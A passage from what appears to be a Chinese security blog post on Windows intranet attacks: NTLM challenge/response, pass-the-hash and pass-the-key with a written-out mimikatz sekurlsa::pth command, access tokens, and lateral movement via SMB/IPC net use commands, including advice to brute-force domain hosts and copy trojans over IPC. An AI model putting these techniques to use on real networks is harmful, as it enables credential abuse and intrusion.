挑战：服务器在收到客户端的协商消息之后， 会读取其中的内容，并从中选择出自己所能接受的服务内容，加密等级，安全服务等等。 并生成一个随机数challenge, 然后生成challenge消息返回给客户端。该消息就是挑战/响应认证机制的主要功能体现。<br>
认证：验证主要是在挑战完成后，验证结果，是认证的最后一步。详细过程如下：</p>
<p>第一步,输入密码,然后LSASS会把密码的NTLM Hash后的值先存储到本地。<br>
第二步,客户端把用户名的明文发送给服务端<br>
第三步,服务端会生成一个16位的随机数,即challenge,再传回给客户端<br>
第四步,当客户端收到challenge后,用在第一步中存储的NTLM Hash对其加密，然后再将加密后的challenge发送给服务器，也就是response。<br>
第五步,服务端在收到response后，会向DC发送针对客户端的验证请求。该请求主要包含以下三方面的内容：客户端用户名、客户端NTLM Hash加密的Challenge、原始的Challenge。<br>
第六步,当DC接到过来的这三个值的以后,会根据用户名到DC的账号数据库(ntds.dit)里面找到该用户名对应的NTLM Hash,然后把这个hash拿出来和传过来的challenge值进行比较,相同则认证成功,反之,则失败。</p>
<p>针对ntml的攻击方式有一种叫做pth（哈希传递攻击）<br>
因为有些系统中密码不是以明文形式存在的 但是我们可以抓取到ntlm hash<br>
这样的话我们就可以通过返回的challenge用我们抓到的hash对其加密从而达到一种不用明文就可通过认证的目的<br>
Pass The Hash能够完成一个不需要输入密码的NTLM协议认证流程，所以不算是一个漏洞，算是一个技巧。常用的pth的工具主要有:mimikatz<br>
当然，pth也是有利用条件的。如果目标机器安装了KB2871997，那我们就不能pth了。那我们还有另一个姿势：PassTheKey。对于8.1/2012r2，<strong>安装补丁kb2871997</strong>的Win7/2008r2/8/2012，可以使用AES keys代替NTLM Hash。在mimikatz抓hash时，可以一并抓到。其实，mimikatz中的pth本身就是ptk了。命令：mimikatz &quot;privilege::debug&quot;&quot;sekurlsa::pth /user:a /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c&quot; 除这些外，还有很多其他姿势，比如打了补丁有administrator帐号扔可pth、当开启Restricted Admin Mode后，win8.1和server12 R2默认支持pth、启用WDigest劫持winlogon仙人跳等</p>
<h2 id="windows-access-token">Windows Access Token</h2>
<p>Windows Access Token(访问令牌)，它是一个描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该进程没有B用户的权限。当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清 除，只有在重启机器后才会清除 Access Token分为两种(主令牌、模拟令牌)</p>
<h1 id="横向移动">横向移动</h1>
<h2 id="smb">SMB</h2>
<p>smb也是一种协议，只不过这种协议是用来文件共享的一般都是通过445or139端口实现使内网上的机器能共享文件，打印机，串行端口和通讯等资源</p>
<h2 id="ipc">IPC</h2>
<p>ipc也是基于SMB协议的一种特殊共享，是进程之间通过命名管道的通信<br>
因为没有密码错误限制所以可以批量爆破域内机器<br>
有些情况内网有些机器不会开3389导致你无法连上的时候你可以通过<br>
ipc复制木马到目标机上运行<br>
常用命令有</p>
<pre><code>0.建立空连接
net use \\192.168.1.1\ipc$ &quot;&quot; /u:&quot;&quot;
1.建立正常连接
net use \\192.168.1.1\ipc$ &quot;1qaz@WSX&quot; /user:&quot;Administrator&quot; 
2.查看本机连接共享情况
net use
3.查看已建立连接目标主机的共享资源
net view \\192.168.1.1
</code></pre>
<h2 id="wmi">WMI</h2>
<p>wmi是windows中由一组工具几何组成，用来管理本地或者远程管理windwos系统的<br>
使用wmi进行攻击windows系统不会在日志中记录这些操作<br>
利用条件是135没过滤</p>
]]></content>
    </entry>
</feed>